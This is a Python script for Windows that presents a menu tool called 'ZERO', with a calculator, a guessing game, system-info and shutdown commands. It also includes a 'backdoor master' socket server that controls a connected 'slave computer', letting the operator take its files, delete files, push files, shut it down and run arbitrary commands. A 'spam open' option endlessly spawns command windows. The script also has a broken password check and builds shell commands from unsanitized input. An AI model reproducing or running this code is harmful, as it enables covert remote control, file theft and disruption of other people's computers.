import time
import os
import random
import socket

first_auth = False
second_auth = False
main_run = True

def auth_1(trial_pass):
    if trial_pass == 'willsy' or 'itachi':
        global first_auth
        first_auth = True
        print('auth 1 gained')
    else:
        print('auth 1 denied')


def auth_2(trial_pass):
    if trial_pass == 'itachi':
        global second_auth
        global first_auth
        first_auth = True
        second_auth = True
        print('auth 2 gained')
    else:
        print('auth 2 denied')


def first_time():
    name = str(input("well then, what's your first name? ")).strip()

    tab_text('welcome ' + name + '!')
    time.sleep(0.5)
    print("i'm ZERO")
    time.sleep(2)
    print("i'm a menu used to control the system and run scripts")
    time.sleep(3)
    print('you can type help if you need a list of commands')


def tab_text(mess):
    os.system('mshta vbscript:Execute("msgbox ""' + mess + '"":close")')

def command(inp):
    os.system(inp)


def binary_to_denary(binary_number_as_string):
    binary_length = len(str(binary_number_as_string))
    total = 0
    for i in range(len(binary_number_as_string)):
        digit = int(binary_number_as_string[i])
        total = total + digit * 2 ** (binary_length - i - 1)
    return total


def denary_to_binary(denary_number_as_interger):
    temp_num = bin(denary_number_as_interger)
    temp_num = temp_num[2:]
    return temp_num


new = str(input('is it your first time? (Y/N) ').strip().lower())
if new == 'y' or new == 'yes':
    first_time()

while main_run is True:
    user_input = str(input('>').strip())
    if user_input == 'help':
        print('Base Commands:          Explanation:')
        print('message                 pop up tab opens with custom message')
        print('cmd                     send a command directly into command prompt')
        print('start                   gives you shutdown options')
        print('calculator              runs a simple calculator')
        print('webpage                 enter webpage url')
        print('guessing game           play a guessing game')
        print('backdoor master         connect to slave computer and execute commands')
        print('system info             grabs and displays system info')
        print('convert                 binary conversion and deanery conversion')
        print('defuse                  cancel shutdown')
        print('auth                    input password to unlock')
        print('')
        print('level 1 auth:')
        print("spam open limited       spam open's cmd 10 times")
        print('')
        print('level 2 auth:')
        print("spam open               spam open's cmd")

    elif user_input == 'quit' or user_input == 'exit' or user_input == 'end':
        main_run = False
    elif user_input == 'shutdown':
        slash = ''
        shutdown_re_sh_sl_choice = True
        while shutdown_re_sh_sl_choice is True:
            print('would you like to:')
            print('- shutdown')
            print('- restart')
            re_sh_sl = input('>>').strip()
            if re_sh_sl == 'shutdown':
                slash = '/s'
                shutdown_re_sh_sl_choice = False
            elif re_sh_sl == 'restart':
                slash = '/r'
                shutdown_re_sh_sl_choice = False
            else:
                print('not valid input')
        time_false = True
        timer = 0
        while time_false is True:
            timer = str(input('when(seconds): ').strip())
            if timer[0] == '1' or timer[0] == '2' or timer[0] == '3' or timer[0] == '4' or timer[0] == '5' or timer[0] == '6' or timer[0] == '7' or timer[0] == '8' or timer[0] == '9' or timer[0] == '0':
                time_false = False
            else:
                print('not valid input')
        time = ' /t ' + timer
        comment = str(input('comment: '))
        com = ' /c "' + comment + '"'
        os.system('shutdown ' + slash + time + com)
    elif user_input == 'message':
        message = str(input('message: '))
        tab_text(message)
    elif user_input == 'cmd':
        com = input('command: ')
        command(com)
    elif user_input == 'start':
        text = input('start: ').strip()
        os.system('start ' + text)
    elif user_input == 'defuse':
        os.system('shutdown /a')
    elif user_input == 'spam open limited':
        if first_auth:
            clock = 0
            while clock < 10:
                clock = clock + 1
                os.system('start')
        else:
            print("don't have required auth")
    elif user_input == 'spam open':
        if second_auth:
            sure = input('are you sure you want to spam open cmd? ').strip().lower()
            if sure == 'y' or sure == 'yes':
                while 1:
                    os.system('start')
            else:
                print('quiting...')
        else:
            print("don't have required auth")
    elif user_input == 'auth':
        trial_pass = input('password:')
        auth_1(trial_pass)
        auth_2(trial_pass)
    elif user_input == 'system info':
        os.system('echo ===============================================')
        os.system('echo name:                               %username%')
        os.system('echo ===============================================')
        os.system('echo OS INFO')
        os.system('echo ===============================================')
        os.system('systeminfo | findstr /c:"OS Name"')
        os.system('systeminfo | findstr /c:"OS Version"')
        os.system('systeminfo | findstr /c:"System Type"')
        os.system('echo ===============================================')
        os.system('echo HARDWARE')
        os.system('echo ===============================================')
        os.system('systeminfo | findstr /c:"Total Physical Memory"')
        os.system('wmic cpu get name')
        os.system('echo ===============================================')
        os.system('echo NETWORK INFO')
        os.system('echo ===============================================')
        os.system('ipconfig | findstr IPv4')
        os.system('ipconfig | findstr IPv6')
    elif user_input == 'guessing game':
        truerun = True
        trueruns_runed = 0

        def demonic_mode():
            run = True
            randomnumber = random.randint(1, 100)
            while run is True:
                guess = input("guess a number between 1 and 100: ")
                if int(randomnumber) == int(guess):
                    print("you're correct!")
                    time.sleep(2)
                    run = False
                else:
                    print("wrong guess")


        def hard_mode():
            run = True
            randomnumber = random.randint(1, 100)
            while run is True:
                guess = input("guess a number between 1 and 100: ")
                if int(randomnumber) == int(guess):
                    print("you're correct!")
                    time.sleep(2)
                    run = False
                if int(randomnumber) > int(guess):
                    print("to low")
                    time.sleep(2)
                if int(randomnumber) < int(guess):
                    print("to high")
                    time.sleep(2)


        def normal_mode():
            run = True
            randomnumber = random.randint(1, 50)
            while run is True:
                guess = input("guess a number between 1 and 50: ")
                if int(randomnumber) == int(guess):
                    print("you're correct!")
                    time.sleep(2)
                    run = False
                if int(randomnumber) > int(guess):
                    print("to low")
                    time.sleep(2)
                if int(randomnumber) < int(guess):
                    print("to high")
                    time.sleep(2)


        def easy_mode():
            run = True
            randomnumber = random.randint(1, 25)
            while run is True:
                guess = input("guess a number between 1 and 25: ")
                if int(randomnumber) == int(guess):
                    print("you're correct!")
                    time.sleep(2)
                    run = False
                if int(randomnumber) > int(guess):
                    print("to low")
                    time.sleep(2)
                if int(randomnumber) < int(guess):
                    print("to high")
                    time.sleep(2)


        while truerun is True:
            ask2 = input("what would you like to play? (demonic mode, hard mode, normal mode, easy mode)")
            if ask2 == "demonic mode":
                demonic_mode()
            if ask2 == "hard mode":
                hard_mode()
            if ask2 == "normal mode":
                normal_mode()
            if ask2 == "easy mode":
                easy_mode()
            else:
                print("not a valid mode")
            trueruns_runed = trueruns_runed + 1
            if trueruns_runed > 0:
                ask = input("do you want to quit?").strip().lower()
                if ask == "yes" or ask == "y":
                    print("thanks for playing")
                    truerun = False
    elif user_input == 'backdoor master':
        run = True
        truerun = True

        # connecting to receiver
        while truerun is True:
            s = socket.socket()
            host = socket.gethostname()
            port = 8080
            s.bind((host, port))
            print("")
            print(" server is currently running @ ", host)
            print(" waiting for incoming connections...")
            s.listen(1)
            conn, addr = s.accept()
            print("")
            print(addr, " has connected to the server successfully")
            run = True

            # connection has been completed

            # command handling

            while run is True:
                try:
                    print("")
                    print(
                        "view_cwd, custom_dir, download_file, remove_file, send_file, shutdown, command, quit, message")
                    print("")
                    command = input(str("command >> "))
                    if command == "view_cwd":
                        conn.send(command.encode())
                        print("command sent waiting for execution...")
                        print("")
                        files = conn.recv(5000)
                        files = files.decode()
                        print("command output : ", files)

                    elif command == "custom_dir":
                        conn.send(command.encode())
                        print("")
                        user_input = input(str("Custom Dir:"))
                        conn.send(user_input.encode())
                        print("")
                        print("command has been sent")
                        print("")
                        files = conn.recv(5000)
                        files = files.decode()
                        print("custom dir result: ", files)

                    elif command == "download_file":
                        conn.send(command.encode())
                        print("")
                        filepath = input("please enter the file path including the filename:")
                        conn.send(filepath.encode())
                        file = conn.recv(100000)
                        print("")
                        filename = input(str("please enter a filename for the incoming file including the extension: "))
                        new_file = open(filename, "wb")
                        new_file.write(file)
                        new_file.close()
                        print("")
                        print(filename, " has been downloaded and saved")

                    elif command == "remove_file":
                        conn.send(command.encode())
                        fileanddir = input(str("please enter the filename and directory: "))
                        conn.send(fileanddir.encode())
                        print("")
                        print(" command has been executed successfully : File Removed")

                    elif command == "send_file":
                        conn.send(command.encode())
                        print("")
                        file = input(str("please enter the filename and directory of the file: "))
                        filename = input(str("please name the file on the receiving computer: "))
                        data = open(file, "rb")
                        file_data = data.read(7000)  # change when file is big
                        conn.send(filename.encode())
                        conn.send(file_data)
                        print(file, "has been sent successfully")

                    elif command == "shutdown":
                        conn.send(command.encode())
                        timer = input("please enter the time until target shuts down:")
                        conn.send(timer.encode())

                    elif command == "quit" or command == "exit" or command == "end":
                        conn.send(command.encode())
                        s.close()
                        run = False
                        truerun = False

                    elif command == "command":
                        conn.send(command.encode())
                        prompt = input("please type in command: ")
                        conn.send(prompt.encode())

                    elif command == "message":
                        conn.send('command'.encode())
                        message = input("please type in message: ")
                        message = 'mshta vbscript:Execute("msgbox ""' + message + '"":close")'
                        conn.send(message.encode())

                    else:
                        print("")
                        print("command not recognised")
                except:
                    print("")
                    print("disconnected")
                    run = False
    elif user_input == 'convert':
        con_q = input('convert to denary or binary: ')
        num = input('input number: ')
        num = num.strip()
        con_q = con_q.strip()

        if str(con_q.lower()) == 'binary' or str(con_q.lower()) == 'binary ':
            print(denary_to_binary(int(num)))
        elif str(con_q.lower()) == 'denary' or str(con_q.lower()) == 'denary ':
            print(binary_to_denary(str(num)))
        else:
            print('not valid input')
    elif user_input == 'calculator':
        run = True

        while run:
            try:
                num1 = int(input("first number:"))
            except:
                print("invalid number")

            op = input("input a Operator:")
            if op != '+' and op != '-' and op != '*' and op != '/':
                print("invalid Operator")
            try:
                num2 = int(input("second number:"))
            except:
                print("invalid number")

            if op == "+":
                print(num1 + num2)
                last_answer = num1 + num2
            elif op == "-":
                print(num1 - num2)
                last_answer = num1 - num2
            elif op == "*" or op == 'x':
                print(num1 * num2)
                last_answer = num1 * num2
            elif op == "/":
                print(num1 / num2)
                last_answer = num1 / num2
            else:
                print("unexpected operation")
            
            carryon = input("type \"quit\" or \"exit\" to exit or anything else carry on:").strip().lower()
            if carryon == "quit" or carryon == 'exit':
                run = False
